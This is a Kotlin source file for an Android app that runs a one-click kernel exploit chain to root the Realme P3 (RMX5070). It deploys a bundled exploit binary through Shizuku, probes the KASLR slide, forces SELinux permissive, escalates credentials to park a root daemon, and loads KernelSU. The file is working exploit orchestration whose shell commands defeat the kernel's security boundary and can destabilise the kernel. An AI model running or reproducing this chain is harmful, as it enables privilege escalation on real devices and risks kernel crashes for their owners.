package com.rmx5070.onekey

import android.content.Context
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.security.MessageDigest

enum class JbStage(val label: String) {
    IDLE("Idle"),
    CHECKING("Preflight"),
    DEPLOYING("Deploy tools"),
    PROBING("KASLR probe"),
    SELINUX("SELinux stage"),
    ESCALATING("Escalating"),
    LOADING_KSU("Loading KernelSU"),
    FINALIZING("Finalizing"),
    DONE("Done"),
    FAILED("Failed"),
}

data class JbOutcome(
    val success: Boolean,
    val message: String,
    val kernelUnstable: Boolean = false,
    val kernelDirty: Boolean = false,
    val ksuLoaded: Boolean = false,
    val slide: Long? = null,
    val deployDir: String? = null,
    val managerMissing: Boolean = false,
    val managerApkPath: String? = null,
)

data class DeviceState(
    val ksuLoaded: Boolean = false,
    val suAvailable: Boolean = false,
    val selinux: String = "Unknown",
    val stalePlant: Boolean = false,
)

class ShellResult(val code: Int, val output: String)

/** Severity of a kernel-log signature found by the canary. */
enum class CanarySeverity { NONE, EXPECTED, FATAL }

data class Canary(val severity: CanarySeverity, val signature: String? = null)

/**
 * One-click RMX5070 (Realme P3) jailbreak driver.
 *
 * The exploit binary itself is untouched; this class only reproduces the
 * validated sequence. `--auto` is the exploit's canonical full chain: it runs
 * the SELinux stage itself, aborts internally if `enforce != 0`, then does the
 * task leak and credential escalation. The app therefore does NOT run a
 * separate `--selinux-only` step.
 *
 *   t98260 --slide-probe
 *   setsid t98260 --auto --slide <slide>          (SELinux + cred + parks rootd)
 *   rootdclient -c "ksud late-load --kmi android14-6.1 ..."
 *   su -c id
 *
 * Nothing here writes to a system partition: the exploit mutates only kernel
 * memory and the manager APK (if installed) lands in userdata via pm. The
 * bundled ksud is used only for "late-load"; "ksud install" is deliberately
 * never run because it installs a userspace component to /system.
 *
 * Safety policy:
 *  - fatal kernel errors (Oops / panic / unable-to-handle / BUG) abort the run
 *    and demand a cold reboot;
 *  - the expected `timerqueue_del` / `posix_cpu_timers_exit` WARNING from the
 *    exploit's own victim reap, and any reclaim miss, mark this boot as
 *    "dirty" and continue (this is inherent to the exploit; aborting on it
 *    would abort nearly every run);
 *  - the kernel release and model must match exactly;
 *  - a leftover parked plant forces a cold reboot before a new exploit run;
 *  - the parked plant is never signalled or killed.
 */
class JailbreakEngine(
    private val appContext: Context,
    private val onLog: (String) -> Unit,
    private val onStage: (JbStage, String) -> Unit,
    private val autoInstallManager: Boolean = true,
) {
    @Volatile
    private var activeDeployDir: String? = null

    @Volatile
    private var runDirty = false

    /** Environment for every privileged shell, matching the validated flow. */
    private val shellEnv = arrayOf(
        "PATH=/system/bin:/system/xbin:/data/adb/ksu/bin",
        "HOME=/data/local/tmp",
        "TMPDIR=/data/local/tmp",
    )

    private fun log(line: String) {
        if (line.isNotBlank()) onLog(line.trimEnd())
    }

    private fun logBlock(text: String) {
        text.lineSequence().forEach { log(it) }
    }

    private fun markDirty(reason: String) {
        if (!runDirty) {
            runDirty = true
            log("kernel timer state is dirty after: $reason (inherent to this exploit; continuing)")
        }
    }

    private suspend fun sh(
        cmd: String,
        env: Array<String>? = shellEnv,
        dir: String = "/data/local/tmp",
    ): ShellResult = withContext(Dispatchers.IO) {
        try {
            val p = PrivService.newProcess(arrayOf("sh", "-c", cmd), env, dir)
            val out = p.getInputStream().bufferedReader().use { it.readText() }
            val rc = p.waitFor()
            ShellResult(rc, out)
        } catch (t: Throwable) {
            ShellResult(-1, "shell error: ${t.message}")
        }
    }

    /**
     * Fire-and-forget launcher. Unlike [sh] it never reads the child's stdout
     * to EOF and never waits. A detached plant parks forever, and an inner
     * shell that waits on it would otherwise keep the inherited pipe open and
     * hang the caller indefinitely.
     */
    private suspend fun shDetach(cmd: String): Unit = withContext(Dispatchers.IO) {
        try {
            val p = PrivService.newProcess(arrayOf("sh", "-c", cmd), shellEnv, "/data/local/tmp")
            runCatching { p.getInputStream().close() }
            runCatching { p.getErrorStream().close() }
            runCatching { p.getOutputStream().close() }
        } catch (t: Throwable) {
            log("detach failed: ${t.message}")
        }
    }

    private suspend fun pushAsset(name: String, dest: String): Int = withContext(Dispatchers.IO) {
        try {
            val p = PrivService.newProcess(arrayOf("sh", "-c", "cat > '$dest'"), shellEnv, "/data/local/tmp")
            p.getOutputStream().use { out ->
                appContext.assets.open("rmx5070/$name").use { it.copyTo(out) }
            }
            p.waitFor()
        } catch (t: Throwable) {
            log("push $name failed: ${t.message}")
            -1
        }
    }

    private fun assetSha256(name: String): String {
        val md = MessageDigest.getInstance("SHA-256")
        appContext.assets.open("rmx5070/$name").use { ins ->
            val buf = ByteArray(1 shl 16)
            while (true) {
                val r = ins.read(buf)
                if (r <= 0) break
                md.update(buf, 0, r)
            }
        }
        return md.digest().joinToString("") { "%02x".format(it) }
    }

    /**
     * Reads the fast fields (KernelSU / su / SELinux) for the home screen.
     * The stale-plant scan is deliberately NOT done here: callers publish
     * this immediately, then call [readStaleFlag] so a slow /proc walk can
     * never gate the device status. Callers may skip the stale scan entirely
     * when [DeviceState.ksuLoaded] is true.
     */
    suspend fun readFastState(): DeviceState {
        if (!PrivService.granted()) return DeviceState()
        val mods = sh("grep -i kernelsu /proc/modules 2>/dev/null")
        val ksu = mods.output.contains("kernelsu", ignoreCase = true)
        val su = if (ksu) sh("su -c id 2>&1").output.contains("uid=0") else false
        val se = sh("getenforce 2>&1").output.trim().let {
            when (it) {
                "Enforcing" -> "Enforcing"
                "Permissive" -> "Permissive"
                "Disabled" -> "Disabled"
                else -> "Unknown"
            }
        }
        return DeviceState(ksu, su, se, stalePlant = false)
    }

    /** True when a leftover t98260 (or t98260-hold) process is present. */
    suspend fun readStaleFlag(): Boolean = hasStalePlant()

    /** Convenience: fast fields plus the stale flag (stale skipped if KSU is loaded). */
    suspend fun readState(): DeviceState {
        val fast = readFastState()
        return if (fast.ksuLoaded) fast else fast.copy(stalePlant = readStaleFlag())
    }

    private fun classifyKernelLog(text: String): Canary {
        if (text.isBlank()) return Canary(CanarySeverity.NONE)
        val fatal = FATAL_SIGNATURES.firstOrNull { text.contains(it) }
        if (fatal != null) return Canary(CanarySeverity.FATAL, fatal)
        val expected = EXPECTED_SIGNATURES.firstOrNull { text.contains(it) }
        if (expected != null) return Canary(CanarySeverity.EXPECTED, expected)
        return Canary(CanarySeverity.NONE)
    }

    /**
     * Kernel-log canary. `dmesg` becomes readable by the shell as soon as the
     * exploit flips SELinux to permissive, and becomes readable as root after
     * late-load; the parked rootd is the last fallback.
     *
     * FATAL signatures mean the kernel is crashing: abort and cold-reboot.
     * EXPECTED signatures (the exploit's own timer reap) only mark the boot
     * dirty and continue.
     */
    private suspend fun canaryHit(): Canary {
        val viaSu = sh("su -c \"dmesg 2>/dev/null | grep -aE '$CANARY_GREP' | tail -n 60\" 2>/dev/null")
        classifyKernelLog(viaSu.output).takeIf { it.severity != CanarySeverity.NONE }?.let { return it }

        val viaShell = sh("dmesg 2>/dev/null | grep -aE '$CANARY_GREP' | tail -n 60")
        classifyKernelLog(viaShell.output).takeIf { it.severity != CanarySeverity.NONE }?.let { return it }

        val dir = activeDeployDir ?: return Canary(CanarySeverity.NONE)
        val viaRootd = sh("'$dir/rootdclient' -c \"dmesg 2>/dev/null | grep -aE '$CANARY_GREP' | tail -n 60\" 2>/dev/null")
        return classifyKernelLog(viaRootd.output)
    }

    private suspend fun hasStalePlant(): Boolean {
        // Single-process scan. The old per-PID `cat` loop forked once per
        // process (~25 s on this phone with ~940 PIDs). `grep -l` walks the
        // same files in one process (~0.07 s) and prints /proc/<pid>/comm for
        // each match, so non-empty output means "a plant exists".
        val r = sh("grep -l t98260 /proc/[0-9]*/comm 2>/dev/null")
        return r.output.isNotBlank()
    }

    private fun newDeployDir(): String {
        val bootId = shSync("cat /proc/sys/kernel/random/boot_id 2>/dev/null").replace("-", "").take(12)
        val id = bootId.ifBlank { "x" }
        return "/data/local/tmp/rmx5070-$id-${System.currentTimeMillis() / 1000}"
    }

    private fun shSync(cmd: String): String = try {
        val p = PrivService.newProcess(arrayOf("sh", "-c", cmd), shellEnv, "/data/local/tmp")
        val out = p.getInputStream().bufferedReader().use { it.readText() }
        p.waitFor()
        out.trim()
    } catch (_: Throwable) {
        ""
    }

    private fun fail(message: String, unstable: Boolean = false): JbOutcome {
        onStage(JbStage.FAILED, message.lineSequence().firstOrNull() ?: "Failed")
        return JbOutcome(
            success = false,
            message = message,
            kernelUnstable = unstable,
            kernelDirty = runDirty || unstable,
        )
    }

    suspend fun run(): JbOutcome {
        runDirty = false

        // ---- 0. preflight -------------------------------------------------
        onStage(JbStage.CHECKING, "Checking Shizuku")
        if (!PrivService.binderAlive()) return fail("Shizuku is not running. Start Shizuku and grant access first.")
        if (!PrivService.granted()) return fail("Shizuku permission was not granted.")

        val kernel = DeviceInfo.kernelRelease()
        log("kernel = $kernel")
        if (!kernel.contains(DeviceInfo.EXPECTED_KERNEL)) {
            return fail(
                "Kernel mismatch, aborted.\ncurrent: $kernel\nrequired: ${DeviceInfo.EXPECTED_KERNEL}\n" +
                    "These constants are compiled for the RMX5070 image; another kernel would write the wrong addresses."
            )
        }
        if (!DeviceInfo.isTargetDevice()) {
            return fail("This is not an RMX5070 / RE608, aborted.\n${DeviceInfo.allModelHints()}")
        }

        val mount = sh("mount 2>/dev/null | grep ' /data/local/tmp '")
        if (mount.output.contains("noexec")) {
            return fail("/data/local/tmp is mounted noexec; cannot run the exploit binary.")
        }
        val tmpProbe = sh("touch /data/local/tmp/.rmx_probe && echo TMP_OK && rm -f /data/local/tmp/.rmx_probe")
        if (!tmpProbe.output.contains("TMP_OK")) {
            return fail("/data/local/tmp is not writable.")
        }
        val trace = sh("[ -d /sys/kernel/tracing ] && echo TRACE_OK")
        if (!trace.output.contains("TRACE_OK")) {
            return fail("tracefs is unavailable (/sys/kernel/tracing).")
        }
        log("SELinux at start = ${sh("getenforce 2>&1").output.trim()}")

        val mods0 = sh("grep -i kernelsu /proc/modules 2>/dev/null")
        val alreadyLoaded = mods0.output.contains("kernelsu", ignoreCase = true)

        if (!alreadyLoaded) {
            if (hasStalePlant()) {
                return fail(
                    "A leftover t98260 process from a previous run was found (an intentionally un-reaped zombie).\n" +
                        "Cold-reboot the phone before running again."
                )
            }
        } else {
            log("KernelSU is already loaded; skipping the exploit.")
        }

        // ---- deploy -------------------------------------------------------
        onStage(JbStage.DEPLOYING, "Deploying binaries")
        val dir = newDeployDir()
        val mk = sh("mkdir -p '$dir' && echo MKDIR_OK")
        if (!mk.output.contains("MKDIR_OK")) return fail("Could not create the deploy directory $dir")
        log("deploy dir = $dir")
        activeDeployDir = dir

        for (name in listOf("t98260", "rootdclient", "ksud")) {
            val rc = pushAsset(name, "$dir/$name")
            if (rc != 0) return fail("Failed to write $name (rc=$rc)")
            val want = assetSha256(name)
            val got = sh("sha256sum '$dir/$name' 2>/dev/null | cut -d' ' -f1").output.trim()
            if (got.isNotEmpty() && got != want) {
                sh("rm -f '$dir/$name'")
                return fail("$name integrity check failed\nwant=$want\ngot =$got")
            }
            log("deployed $name (sha256 ${want.take(12)}...)")
        }
        sh("chmod 755 '$dir/t98260' '$dir/rootdclient' '$dir/ksud'")

        if (alreadyLoaded) {
            return finalize(dir, DeviceInfo.kernelRelease(), null)
        }

        // ---- 1. slide probe (read-only) ----------------------------------
        onStage(JbStage.PROBING, "Probing KASLR slide")
        val probe = sh("'$dir/t98260' --slide-probe 2>&1")
        logBlock(probe.output)
        val slide = Regex("SLIDE_DERIVED=(0x[0-9a-fA-F]+)").find(probe.output)
            ?.groupValues?.get(1)?.removePrefix("0x")?.toLongOrNull(16)
        if (probe.code != 0 || slide == null) {
            return fail("KASLR probe failed (rc=${probe.code}); nothing was written.")
        }
        log("slide = 0x${slide.toString(16)}")

        // ---- 2. full chain: --auto includes SELinux + task + cred ---------
        // The exploit itself refuses to enter the cred stage unless
        // enforce_state()==0, so the pre-cred gate still holds internally.
        onStage(JbStage.SELINUX, "SELinux + escalation (--auto)")
        val autoLog = "$dir/auto.log"
        val launch = "rm -f '$autoLog'; " +
            "setsid sh -c \"exec '$dir/t98260' --auto --slide 0x${slide.toString(16)} --budget 300 " +
            "> '$autoLog' 2>&1 </dev/null\" >/dev/null 2>&1 </dev/null &"
        shDetach(launch)

        var started = false
        for (i in 0 until 12) {
            delay(500)
            if (sh("[ -e '$autoLog' ] && echo YES").output.contains("YES")) {
                started = true
                break
            }
        }
        if (!started) {
            return fail("Failed to start the --auto stage (auto.log was never created).")
        }

        var credOk = false
        var emitted = 0
        var lastMarker = ""
        val startedAt = System.currentTimeMillis()
        val deadline = startedAt + 340_000
        while (System.currentTimeMillis() < deadline) {
            delay(3000)
            val text = sh("cat '$autoLog' 2>/dev/null").output
            if (text.length > emitted) {
                text.substring(emitted).lineSequence().forEach { log(it) }
                emitted = text.length
            }

            // Stage progression from the exploit's own markers.
            val marker = when {
                text.contains("STAGE=rootd") -> "rootd"
                text.contains("STAGE=cred") -> "cred"
                text.contains("STAGE=task") -> "task"
                text.contains("STAGE=selinux") -> "selinux"
                else -> ""
            }
            if (marker != lastMarker) {
                lastMarker = marker
                when (marker) {
                    "selinux" -> onStage(JbStage.SELINUX, "SELinux -> Permissive (inside --auto)")
                    "task" -> onStage(JbStage.ESCALATING, "Leaking a victim task")
                    "cred" -> onStage(JbStage.ESCALATING, "Escalating credentials")
                    "rootd" -> onStage(JbStage.ESCALATING, "Parking rootd")
                }
            }

            // A reclaim miss leaves a stale timer node pinned; this boot is
            // dirty even if no WARN was emitted (WARN_ON_ONCE logs once).
            if (text.contains("RECLAIM_MISS_RETRY") || text.contains("SELINUX_MISS") || text.contains("SLIDE_MISS")) {
                markDirty("reclaim miss")
            }

            // Defense in depth: the exploit must not enter the cred stage
            // unless SELinux became permissive first.
            if ((text.contains("STAGE=task") || text.contains("STAGE=cred")) &&
                !text.contains("SELINUX=permissive") && !text.contains("SELINUX=already")
            ) {
                return fail("SELinux was not permissive before the credential stage; aborted, do not continue.")
            }

            if (text.contains("PLANT_CRED_OK")) {
                credOk = true
                break
            }
            if (text.contains("FAIL=") || text.contains("FAIL_EXIT")) break

            when (val c = canaryHit()) {
                is Canary -> when (c.severity) {
                    CanarySeverity.FATAL -> return fail(
                        "Fatal kernel error (${c.signature}). Cold-reboot now; do not continue.",
                        unstable = true,
                    )
                    CanarySeverity.EXPECTED -> markDirty(c.signature ?: "kernel warning")
                    CanarySeverity.NONE -> Unit
                }
            }

            onStage(JbStage.ESCALATING, "Escalating... ${(System.currentTimeMillis() - startedAt) / 1000}s")
        }
        if (!credOk) {
            val tail = sh("tail -n 20 '$autoLog' 2>/dev/null").output
            return fail("Escalation failed or timed out.\n${tail.trim()}")
        }
        log("PLANT_CRED_OK: rootd is parked")

        // park_forever() prints ROOTD_LISTEN once the unix socket accepts; wait
        // for it (or a successful connect) before driving late-load.
        var rootdUp = false
        for (i in 0 until 40) {
            val t = sh("cat '$autoLog' 2>/dev/null").output
            if (t.contains("ROOTD_LISTEN") || t.contains("ROOTD_RETIRED")) {
                rootdUp = true
                break
            }
            delay(500)
        }
        if (!rootdUp) {
            val probe = sh("'$dir/rootdclient' -c id 2>&1")
            if (!probe.output.contains("uid=0")) {
                return fail("rootd socket is not ready; cannot load KernelSU.\n${probe.output.trim()}")
            }
        }
        log("rootd socket is ready")

        // ---- 3. load KernelSU through rootd ------------------------------
        onStage(JbStage.LOADING_KSU, "Loading KernelSU via rootd")
        val late = sh(
            "'$dir/rootdclient' -c \"'$dir/ksud' late-load --kmi ${DeviceInfo.KMI} " +
                "--allow-shell --package-name ${DeviceInfo.MANAGER_PKG}\" 2>&1"
        )
        logBlock(late.output)
        var ksu = false
        for (i in 0 until 60) {
            if (sh("grep -qi kernelsu /proc/modules && echo YES").output.contains("YES")) {
                ksu = true
                break
            }
            delay(1000)
        }
        if (!ksu) {
            return fail("KernelSU module did not load. rootd is still up; you can retry.\n${late.output.trim()}")
        }
        log("kernelsu module loaded")

        return finalize(dir, kernel, slide)
    }

    private suspend fun finalize(dir: String, kernel: String, slide: Long?): JbOutcome {
        onStage(JbStage.FINALIZING, "Verifying root")
        var suOk = false
        for (i in 0 until 30) {
            if (sh("su -c id 2>&1").output.contains("uid=0")) {
                suOk = true
                break
            }
            delay(1000)
        }
        if (!suOk) {
            return fail("KernelSU is loaded but su is not ready yet. Retry shortly or grant access in the manager.")
        }
        log("su available: ${sh("su -c id").output.trim()}")

        val se = sh("su -c getenforce 2>&1").output.trim()
        log("SELinux = $se")
        val managerMissing = if (autoInstallManager) installManagerIfNeeded(dir) else false

        when (val c = canaryHit()) {
            is Canary -> when (c.severity) {
                CanarySeverity.FATAL -> return fail(
                    "Fatal kernel error after root (${c.signature}). Cold-reboot immediately.",
                    unstable = true,
                )
                CanarySeverity.EXPECTED -> markDirty(c.signature ?: "kernel warning")
                CanarySeverity.NONE -> Unit
            }
        }

        onStage(JbStage.DONE, "Jailbreak complete")
        val base = if (managerMissing) {
            "KernelSU is loaded and su works. The manager is not installed; you can install it from the app."
        } else {
            "KernelSU is loaded and su works."
        }
        return JbOutcome(
            success = true,
            message = if (runDirty) {
                "$base\nKernel timer state is dirty: do not tether, minimise app churn, and reboot when done."
            } else {
                base
            },
            kernelDirty = runDirty,
            ksuLoaded = true,
            slide = slide,
            deployDir = dir,
            managerMissing = managerMissing,
            managerApkPath = if (managerMissing) "$dir/KernelSU.apk" else null,
        )
    }

    private suspend fun isManagerInstalled(): Boolean =
        sh("pm path ${DeviceInfo.MANAGER_PKG} 2>/dev/null").output.contains("package:")

    /**
     * Installs the bundled KernelSU manager APK through the fresh root. Returns
     * true when the manager is still missing afterwards (so the UI can offer a
     * user-driven install fallback). Never touches a system partition: pm
     * installs land in /data/app.
     */
    private suspend fun installManagerIfNeeded(dir: String): Boolean {
        if (isManagerInstalled()) {
            log("KernelSU manager is already installed")
            return false
        }
        log("Deploying and installing the KernelSU manager...")
        if (pushAsset("KernelSU.apk", "$dir/KernelSU.apk") != 0) {
            log("Manager APK deploy failed; you can install it manually later")
            return true
        }
        for (cmd in listOf(
            "pm install -r -t --user 0 '$dir/KernelSU.apk'",
            "cmd package install -r -t --user 0 '$dir/KernelSU.apk'",
        )) {
            val out = sh("su -c \"$cmd\" 2>&1")
            logBlock(out.output)
            if (out.output.contains("Success") || isManagerInstalled()) {
                log("KernelSU manager installed")
                return false
            }
        }
        log("Automatic manager install failed; use the in-app button to install manually")
        return true
    }

    companion object {
        /** Only fatal kernel-crash signatures abort the run. */
        private val FATAL_SIGNATURES = listOf(
            "Unable to handle kernel paging request",
            "Unable to handle kernel NULL pointer dereference",
            "Internal error: Oops",
            "Oops: ",
            "Kernel panic",
            "not syncing",
            "kernel BUG at",
            "BUG: unable to handle",
        )

        /** Expected during a successful run: mark the boot dirty, keep going. */
        private val EXPECTED_SIGNATURES = listOf(
            "timerqueue_del",
            "posix_cpu_timers_exit",
            "rb_next",
        )

        private const val CANARY_GREP =
            "timerqueue_del|posix_cpu_timers_exit|rb_next|Unable to handle|Kernel panic|not syncing|Internal error: Oops|Oops:|kernel BUG at|BUG: unable to handle"
    }
}